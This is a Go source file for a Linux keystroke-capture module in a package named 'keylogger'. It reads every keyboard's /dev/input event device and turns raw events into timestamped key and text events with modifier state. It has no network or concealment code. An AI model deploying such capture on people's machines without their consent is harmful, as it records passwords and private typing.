//go:build linux

package keylogger

import (
	"bufio"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	linuxEventKey = 0x01
)

type linuxInputEvent struct {
	Sec   int64
	Usec  int64
	Type  uint16
	Code  uint16
	Value int32
}

type linuxProvider struct {
	findDevices func() ([]string, error)
	openDevice  func(string) (io.ReadCloser, error)
}

func newLinuxProvider() *linuxProvider {
	finder := linuxDeviceFinder
	if finder == nil {
		finder = detectKeyboardDevices
	}
	opener := linuxDeviceOpener
	if opener == nil {
		opener = func(path string) (io.ReadCloser, error) {
			return os.Open(path)
		}
	}
	return &linuxProvider{
		findDevices: finder,
		openDevice:  opener,
	}
}

func defaultProviderFactory() func() Provider {
	return func() Provider {
		return newLinuxProvider()
	}
}

func (p *linuxProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	if ctx == nil {
		ctx = context.Background()
	}

	devices, err := p.findDevices()
	if err != nil || len(devices) == 0 {
		return nil, ErrProviderUnavailable
	}

	normalized := cfg.normalize()
	stream := newChannelEventStream(normalized.BufferSize)
	modifiers := &modifierState{}

	var wg sync.WaitGroup
	started := 0

	for _, device := range devices {
		rc, openErr := p.openDevice(device)
		if openErr != nil {
			continue
		}
		started++
		wg.Add(1)
		go func(r io.ReadCloser) {
			defer wg.Done()
			defer r.Close()
			p.readEvents(ctx, r, stream, modifiers)
		}(rc)
	}

	if started == 0 {
		stream.Close()
		return nil, ErrProviderUnavailable
	}

	go func() {
		<-ctx.Done()
		stream.Close()
	}()

	go func() {
		wg.Wait()
		stream.Close()
	}()

	return stream, nil
}

func (p *linuxProvider) readEvents(ctx context.Context, r io.Reader, stream *channelEventStream, modifiers *modifierState) {
	decoder := binary.LittleEndian
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		var ev linuxInputEvent
		if err := binary.Read(r, decoder, &ev); err != nil {
			return
		}
		if ev.Type != linuxEventKey {
			continue
		}

		pressed := ev.Value != 0

		if isModifierKey(ev.Code) {
			modifiers.set(ev.Code, pressed)
		}
		alt, ctrl, shift, meta := modifiers.snapshot()

		key := keyForScanCode(ev.Code)
		timestamp := time.Unix(ev.Sec, ev.Usec*1000).UTC()

		event := CaptureEvent{
			Timestamp: timestamp,
			Key:       key,
			RawCode:   fmt.Sprintf("%d", ev.Code),
			ScanCode:  ev.Code,
			Pressed:   pressed,
			Alt:       alt,
			Ctrl:      ctrl,
			Shift:     shift,
			Meta:      meta,
		}

		if pressed && len(key) == 1 {
			if shift {
				event.Text = strings.ToUpper(key)
			} else {
				event.Text = key
			}
		}

		if !stream.emit(ctx, event) {
			return
		}
	}
}

var linuxDeviceFinder = detectKeyboardDevices

func detectKeyboardDevices() ([]string, error) {
	file, err := os.Open("/proc/bus/input/devices")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var devices []string
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "H: Handlers=") {
			continue
		}
		handlers := strings.Fields(strings.TrimPrefix(line, "H: Handlers="))
		hasKeyboard := false
		var eventNames []string
		for _, handler := range handlers {
			if handler == "kbd" || strings.Contains(strings.ToLower(handler), "keyboard") {
				hasKeyboard = true
			}
			if strings.HasPrefix(handler, "event") {
				eventNames = append(eventNames, handler)
			}
		}
		if hasKeyboard {
			for _, name := range eventNames {
				devices = append(devices, filepath.Join("/dev/input", name))
			}
		}
	}
	if len(devices) == 0 {
		return nil, fmt.Errorf("no keyboard devices found")
	}
	return devices, nil
}

var linuxDeviceOpener = func(path string) (io.ReadCloser, error) {
	return os.Open(path)
}

type modifierState struct {
	mu    sync.RWMutex
	alt   bool
	ctrl  bool
	shift bool
	meta  bool
}

func (m *modifierState) set(code uint16, pressed bool) {
	m.mu.Lock()
	switch code {
	case 29, 97:
		m.ctrl = pressed
	case 56, 100:
		m.alt = pressed
	case 42, 54:
		m.shift = pressed
	case 125, 126, 133, 134:
		m.meta = pressed
	}
	m.mu.Unlock()
}

func (m *modifierState) snapshot() (alt, ctrl, shift, meta bool) {
	m.mu.RLock()
	alt, ctrl, shift, meta = m.alt, m.ctrl, m.shift, m.meta
	m.mu.RUnlock()
	return
}

func isModifierKey(code uint16) bool {
	switch code {
	case 29, 97, 56, 100, 42, 54, 125, 126, 133, 134:
		return true
	default:
		return false
	}
}

func keyForScanCode(code uint16) string {
	if name, ok := linuxKeyNames[code]; ok {
		return name
	}
	return fmt.Sprintf("key_%d", code)
}

var linuxKeyNames = map[uint16]string{
	1:   "esc",
	2:   "1",
	3:   "2",
	4:   "3",
	5:   "4",
	6:   "5",
	7:   "6",
	8:   "7",
	9:   "8",
	10:  "9",
	11:  "0",
	12:  "-",
	13:  "=",
	14:  "backspace",
	15:  "tab",
	16:  "q",
	17:  "w",
	18:  "e",
	19:  "r",
	20:  "t",
	21:  "y",
	22:  "u",
	23:  "i",
	24:  "o",
	25:  "p",
	26:  "[",
	27:  "]",
	28:  "enter",
	29:  "ctrl",
	30:  "a",
	31:  "s",
	32:  "d",
	33:  "f",
	34:  "g",
	35:  "h",
	36:  "j",
	37:  "k",
	38:  "l",
	39:  ";",
	40:  "'",
	41:  "`",
	42:  "shift",
	43:  "\\",
	44:  "z",
	45:  "x",
	46:  "c",
	47:  "v",
	48:  "b",
	49:  "n",
	50:  "m",
	51:  ",",
	52:  ".",
	53:  "/",
	54:  "shift",
	55:  "kp_*",
	56:  "alt",
	57:  "space",
	58:  "capslock",
	59:  "f1",
	60:  "f2",
	61:  "f3",
	62:  "f4",
	63:  "f5",
	64:  "f6",
	65:  "f7",
	66:  "f8",
	67:  "f9",
	68:  "f10",
	69:  "numlock",
	70:  "scrolllock",
	71:  "kp_7",
	72:  "kp_8",
	73:  "kp_9",
	74:  "kp_-",
	75:  "kp_4",
	76:  "kp_5",
	77:  "kp_6",
	78:  "kp_+",
	79:  "kp_1",
	80:  "kp_2",
	81:  "kp_3",
	82:  "kp_0",
	83:  "kp_.",
	96:  "kp_enter",
	97:  "ctrl",
	98:  "kp_/",
	99:  "printscreen",
	100: "alt",
	102: "home",
	103: "up",
	104: "pageup",
	105: "left",
	106: "right",
	107: "end",
	108: "down",
	109: "pagedown",
	110: "insert",
	111: "delete",
	113: "mute",
	114: "volumedown",
	115: "volumeup",
	116: "power",
	125: "meta",
	126: "meta",
	133: "meta",
	134: "meta",
}
